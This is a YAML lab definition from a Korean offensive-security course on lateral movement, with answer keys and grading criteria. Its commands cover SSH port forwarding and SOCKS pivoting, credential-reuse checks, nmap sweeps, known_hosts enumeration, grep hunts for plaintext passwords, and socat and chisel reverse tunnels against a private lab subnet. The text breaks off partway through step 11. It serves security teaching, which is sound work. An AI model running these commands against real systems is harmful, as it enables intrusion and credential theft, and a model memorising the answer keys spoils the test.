lab_id: attack-nonai-week10
title: 측면 이동 (Lateral Movement)
version: non-ai
course: attack-nonai
week: 10
description: 내부 네트워크에서 다른 시스템으로 이동하는 측면 이동(Lateral Movement) 기법을 실습한다. SSH 피봇, 포트 포워딩, 프록시체인, Pass-the-Hash
  등을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- SSH 터널링과 포트 포워딩을 사용한 네트워크 피봇팅을 수행할 수 있다
- 내부 네트워크의 다른 시스템으로 접근을 확대할 수 있다
- 측면 이동의 탐지 방법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: web 서버({{WEB_IP}})에 SSH 로컬 포트 포워딩을 설정하여 SIEM 서버({{SECU_IP}}00)의 Wazuh 웹 인터페이스(443)에 접근하라.
  hint: ssh -L 로컬포트:대상:원격포트 형태로 터널을 생성한다
  category: exploit
  points: 10
  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인

    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 ccc@10.20.30.80
    2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head -20 && echo ''Port forwarding to
    SIEM:443 established'''
  answer_detail: SSH 로컬 포트 포워딩(-L)은 로컬 포트를 원격 네트워크의 서비스로 터널링한다. 방화벽이 직접 접근을 차단하더라도 SSH 터널을 통해 내부 서비스에
    접근할 수 있다.
  verify:
    type: output_contains
    expect: Port forwarding
    field: stdout
    semantic:
      intent: SSH 로컬 포트 포워딩 — sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443
        ccc@10.20.30.80 && curl -sk https://localhost:8443. MITRE T1572 Protocol Tunneling + T1021.004
        SSH. -L 로컬포트:원격대상:원격포트. 방화벽 우회 피봇.
      success_criteria:
      - ssh -L + 8443:10.20.30.100:443 형태
      - Port forwarding 키워드 + curl 검증
      - -f -N 백그라운드 터널
      acceptable_methods:
      - ssh -L 로컬:SIEM:443
      - ssh -o ProxyCommand로 단일 명령
      - SSH config ProxyJump 설정
      negative_signs:
      - -L 없음
      - 포트 포워딩 검증 없음
      - 원격 IP/포트 하드코딩 없음
  target_vm: attacker
- order: 2
  instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 설정하여 web 서버를 통한 전체 네트워크 접근을 확보하라.
  hint: ssh -D 포트 옵션으로 SOCKS 프록시를 생성한다
  category: exploit
  points: 10
  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80 2>/dev/null && sleep
    1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp | grep 1080
  answer_detail: SSH 동적 포트 포워딩(-D)은 SOCKS4/5 프록시를 생성한다. proxychains와 연동하면 모든 도구의 트래픽을 SSH 터널을 통해 전달할 수
    있어 내부 네트워크 전체에 접근이 가능하다.
  verify:
    type: output_contains
    expect: SOCKS proxy established
    field: stdout
    semantic:
      intent: SSH 동적 포워딩 SOCKS — sshpass -p1 ssh -f -N -D 1080 ccc@10.20.30.80 && ss -tlnp | grep 1080.
        MITRE T1572. SOCKS4/5 프록시 + proxychains 연동으로 내부망 전체 도구 터널링. -D 포트.
      success_criteria:
      - ssh -D 1080 형태
      - SOCKS proxy established 확인
      - 리스닝 포트 검증 (ss/netstat)
      acceptable_methods:
      - ssh -D 1080 동적 포워딩
      - proxychains4 연동
      - tsocks / redsocks
      negative_signs:
      - -D 없음
      - 리스닝 검증 없음
      - SOCKS 맥락 없음
  target_vm: attacker
- order: 3
  instruction: web 서버에서 내부 네트워크를 스캔하여 추가 공격 대상을 발견하라. SSH를 통해 원격으로 nmap을 실행하라.
  hint: SSH를 통해 web 서버에서 nmap을 실행한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24 2>/dev/null' 2>/dev/null
  answer_detail: 피봇 호스트에서 내부 네트워크를 스캔하면 직접 접근할 수 없는 시스템을 발견할 수 있다. 피봇 호스트의 네트워크 위치에 따라 다른 서브넷에 접근이 가능해질
    수 있다.
  verify:
    type: output_contains
    expect: Nmap scan report
    field: stdout
    semantic:
      intent: 피봇 내부 스캔 — ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24'. MITRE T1046 Network Service Discovery
        + T1018 Remote System Discovery. SSH 원격 실행으로 피봇 호스트 시야 확보.
      success_criteria:
      - ssh + nmap 원격 실행
      - Nmap scan report 출력
      - /24 대역 ping sweep
      acceptable_methods:
      - ssh + nmap -sn
      - proxychains nmap
      - fping/arp-scan via SSH
      negative_signs:
      - SSH 원격 실행 없음
      - nmap 결과 없음
      - 서브넷 스캔 없음
  target_vm: attacker
- order: 4
  instruction: web 서버에서 secu 서버({{SECU_IP}})로 SSH 접속을 시도하라. 동일한 자격 증명이 재사용되는지 확인하라.
  hint: sshpass로 같은 비밀번호를 사용하여 접속을 시도한다
  category: exploit
  points: 10
  answer: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null && echo ''Credential
    reuse confirmed: web -> secu'''
  answer_detail: 자격 증명 재사용은 측면 이동의 가장 흔한 벡터이다. 한 시스템에서 획득한 비밀번호가 다른 시스템에서도 유효하면 연쇄적으로 침투가 확대된다. 각 시스템별
    고유한 비밀번호와 MFA가 필수적이다.
  verify:
    type: output_contains
    expect: Credential reuse
    field: stdout
    semantic:
      intent: 자격증명 재사용 web→secu — ssh ccc@10.20.30.80 'ssh ccc@10.20.30.1 hostname'. MITRE T1078 Valid
        Accounts + T1550 Use Alternate Authentication Material. 동일 비번 재사용이 측면이동 주요 벡터. MFA/유니크 비번 필수.
      success_criteria:
      - 중첩 SSH (web 경유 secu 접속)
      - Credential reuse 확인 출력
      - 동일 계정/비번 재사용 검증
      acceptable_methods:
      - ssh 중첩
      - ssh -J ProxyJump
      - sshpass 반복
      negative_signs:
      - 중첩 SSH 없음
      - 재사용 확인 없음
      - 단순 로컬 SSH
  target_vm: attacker
- order: 5
  instruction: SSH 리모트 포트 포워딩을 설정하라. web 서버에서 공격자 머신으로 역방향 터널을 만들어 내부 서비스를 외부에 노출하라.
  hint: ssh -R 원격포트:로컬호스트:로컬포트 형태이다
  category: exploit
  points: 10
  answer: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443 ccc@10.20.30.201''
    && echo ''Effect: attacker:9090 -> siem:443 via web server'' && echo ''---'' && echo ''This allows
    accessing internal SIEM from external network'' && echo ''Detection: monitor SSH sessions with -R
    flag'''
  answer_detail: 리모트 포트 포워딩(-R)은 원격 서버의 포트를 로컬 네트워크로 매핑한다. 내부 네트워크의 서비스를 외부에 노출시킬 수 있어 데이터 유출이나 추가 침투에
    활용된다.
  verify:
    type: output_contains
    expect: Remote Port Forwarding
    field: stdout
    semantic:
      intent: SSH 리모트 포워딩 -R — ssh -R 9090:10.20.30.100:443 ccc@attacker. MITRE T1572 Protocol Tunneling
        + T1090.001 Internal Proxy. 내부 서비스를 외부로 역노출. 데이터 유출/추가 침투 통로.
      success_criteria:
      - ssh -R 9090:10.20.30.100:443 형태
      - Remote Port Forwarding 키워드
      - 역방향 터널 설명
      acceptable_methods:
      - ssh -R 원격:로컬:로컬포트
      - autossh 지속 리버스
      - chisel reverse client
      negative_signs:
      - -R 없음
      - 역방향 개념 없음
      - 탐지 가이드 없음
  target_vm: attacker
- order: 6
  instruction: web 서버의 SSH known_hosts 파일을 확인하여 이전에 접속한 호스트 목록을 파악하라.
  hint: ~/.ssh/known_hosts 파일을 확인한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; cat /etc/ssh/ssh_known_hosts
    2>/dev/null' 2>/dev/null | head -20
  answer_detail: known_hosts 파일에는 이전에 SSH로 접속한 호스트의 키 지문이 저장된다. 이를 통해 관리자가 자주 접속하는 서버를 파악하여 측면 이동의 다음
    대상을 선정할 수 있다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: known_hosts 열거 — ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts; cat /etc/ssh/ssh_known_hosts'.
        MITRE T1083 File and Directory Discovery + T1018 Remote System Discovery. 관리자 자주 접속 서버 파악 → 다음
        피봇 대상 선정.
      success_criteria:
      - ~/.ssh/known_hosts 읽기
      - 시스템 known_hosts 병행
      - '--- 구분자 출력'
      acceptable_methods:
      - cat ~/.ssh/known_hosts
      - awk로 호스트 파싱
      - ssh-keygen -F로 해시 역산
      negative_signs:
      - known_hosts 경로 없음
      - 파일 읽기 없음
      - 대상 선정 맥락 없음
  target_vm: attacker
- order: 7
  instruction: web 서버에서 SIEM 서버({{SECU_IP}}00)로 점프하여 Wazuh 설정을 확인하라. 이중 SSH 점프를 사용하라.
  hint: ssh -J 점프호스트 형태로 프록시 점프를 사용한다
  category: exploit
  points: 10
  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인

    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100 ''hostname
    && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"'' 2>/dev/null'
  answer_detail: SSH ProxyJump(-J)는 중간 호스트를 경유하여 최종 목적지에 접속하는 기능이다. 다단계 네트워크 환경에서 여러 호스트를 경유하여 내부 깊숙한
    시스템에 접근할 수 있다.
  verify:
    type: output_contains
    expect: Wazuh
    field: stdout
    semantic:
      intent: SSH ProxyJump -J 다단계 — sshpass -p1 ssh -J ccc@10.20.30.80 ccc@10.20.30.100 'hostname &&
        ls /var/ossec/etc/'. MITRE T1021.004 SSH + T1572. -J로 점프호스트 경유, 최종 SIEM 접속 후 Wazuh 설정 확인.
      success_criteria:
      - ssh -J 점프호스트 최종대상
      - Wazuh 키워드 확인
      - 다단계 점프 성공
      acceptable_methods:
      - ssh -J host1 host2
      - SSH config ProxyJump 지시어
      - ssh -o ProxyCommand="ssh -W %h:%p host1"
      negative_signs:
      - -J 또는 ProxyJump 없음
      - 중간 호스트 없음
      - 단일 SSH 세션
  target_vm: attacker
- order: 8
  instruction: web 서버에 저장된 다른 서비스의 인증 정보를 검색하라. 설정 파일, 스크립트, 히스토리에서 비밀번호를 찾아라.
  hint: grep -r로 password, pass, key 등의 키워드를 검색한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo ---; grep -rl "pass"
    /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
    | head -5' 2>/dev/null
  answer_detail: 설정 파일에 평문으로 저장된 비밀번호는 측면 이동의 핵심 정보이다. 데이터베이스 연결 정보, API 키, 서비스 계정 비밀번호 등이 하드코딩되어 있으면
    다른 시스템으로의 접근이 가능해진다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: 인증 정보 헌팅 — ssh ccc@10.20.30.80 'grep -rl password /etc/; grep -rl pass /home/; find / -name
        *.conf -exec grep -l password {} ;'. MITRE T1552.001 Credentials In Files + T1083. 설정파일/스크립트/히스토리에서
        평문 비밀번호 수집.
      success_criteria:
      - grep -r password / pass 검색
      - 설정파일 + 홈디렉터리 동시 검색
      - find + grep 조합
      acceptable_methods:
      - grep -r password
      - LinPEAS credential 섹션
      - LaZagne
      negative_signs:
      - password 키워드 검색 없음
      - 단일 경로만 검색
      - 헌팅 결과 누락
  target_vm: attacker
- order: 9
  instruction: web 서버의 네트워크 인터페이스와 라우팅 테이블을 확인하여 접근 가능한 추가 네트워크 대역을 파악하라.
  hint: ip addr show와 ip route show 명령을 사용한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null' 2>/dev/null
  answer_detail: 다중 네트워크 인터페이스가 있는 호스트는 서로 다른 네트워크 대역을 연결하는 피봇 포인트이다. 라우팅 테이블에서 추가 서브넷을 발견하면 공격 범위를 확장할
    수 있다.
  verify:
    type: output_contains
    expect: inet
    field: stdout
    semantic:
      intent: 인터페이스/라우팅 열거 — ssh ccc@10.20.30.80 'ip addr show; ip route show'. MITRE T1016 System Network
        Configuration Discovery. 다중 NIC 호스트는 피봇 포인트, 라우팅 테이블에서 추가 서브넷 발견 → 공격 범위 확장.
      success_criteria:
      - ip addr + ip route 병행
      - inet 키워드 (인터페이스 출력)
      - 라우팅 테이블 노출
      acceptable_methods:
      - ip addr/route
      - ifconfig + route -n
      - netstat -rn
      negative_signs:
      - 라우팅 미확인
      - 인터페이스만 확인
      - 피봇 맥락 없음
  target_vm: attacker
- order: 10
  instruction: chisel이나 socat을 사용한 터널링 대안을 설명하라. SSH가 사용 불가능한 환경에서의 피봇팅 방법을 제시하라.
  hint: socat으로 TCP 릴레이를 구성한다
  category: analysis
  points: 10
  answer: 'echo ''=== Alternative Pivoting Tools ==='' && echo ''1. socat: socat TCP-LISTEN:8080,fork
    TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server) / chisel client
    ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3. ligolo: Agent-based tunnel, no SOCKS
    overhead'' && echo ''4. rpivot: Reverse SOCKS proxy via Python'' && echo ''---'' && echo ''When to
    use: SSH unavailable, need SOCKS proxy, limited tools on target'''
  answer_detail: SSH 이외의 터널링 도구는 SSH가 차단되거나 설치되지 않은 환경에서 유용하다. chisel은 HTTP/WebSocket 기반으로 방화벽 우회가 쉽고,
    socat은 범용 네트워크 릴레이 도구이다.
  verify:
    type: output_contains
    expect: Alternative Pivoting Tools
    field: stdout
    semantic:
      intent: 대안 피봇 도구 — socat TCP-LISTEN:8080,fork TCP:SIEM:443 / chisel server -p 8080 --reverse + client
        R:9090:target:443 / ligolo / rpivot. MITRE T1572 + T1090. SSH 차단 환경용 HTTP/WebSocket 터널.
      success_criteria:
      - Alternative Pivoting Tools 키워드
      - socat + chisel 2개 이상 제시
      - 사용 시나리오 (SSH 차단 등)
      acceptable_methods:
      - socat TCP 릴레이
      - chisel HTTP 터널
      - ligolo-ng / rpivot / revsocks
      negative_signs:
      - 도구 1개 이하
      - 명령 예시 없음
      - SSH 대안 맥락 없음
  target_vm: attacker
- order: 11
  instruction: 내부 서비스 열거를 위해 web 서버에서 secu 서버({{SECU_IP}})의 주요 포트를 스캔하라.
  hint: SSH를 통해 원격에서 nmap을 실행한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null' 2>/dev/null
